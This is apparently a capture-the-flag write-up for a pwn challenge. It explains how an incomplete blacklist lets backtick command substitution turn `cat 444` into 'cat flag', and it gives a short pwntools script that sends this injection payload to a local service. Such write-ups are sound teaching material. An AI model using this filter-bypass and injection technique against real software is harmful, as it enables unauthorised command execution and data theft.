**Vulnerability:** Command Injection. 

When the program opens a user-selected file, it validates the input by blacklisting the string "flag" and several other specific characters. However, the filtering is incomplete. We can still utilize unblocked characters to perform a **command injection** and read the flag.

For example, backticks (```) are permitted. By reading the file `444`, we discover it contains the string "flag". Consequently, we can construct a command such as `cat \`cat 444``. This will be evaluated by the shell as `cat flag`, effectively bypassing the string filter.

The exploit script (exp) is as follows:

```python
from pwn import*
context(log_level="debug",arch="amd64")
#p=process("./pwn")
p=remote("127.0.0.1",10004)
p.recvuntil("😏:\n")	
p.send(b'`cat 444`');
p.interactive()
```

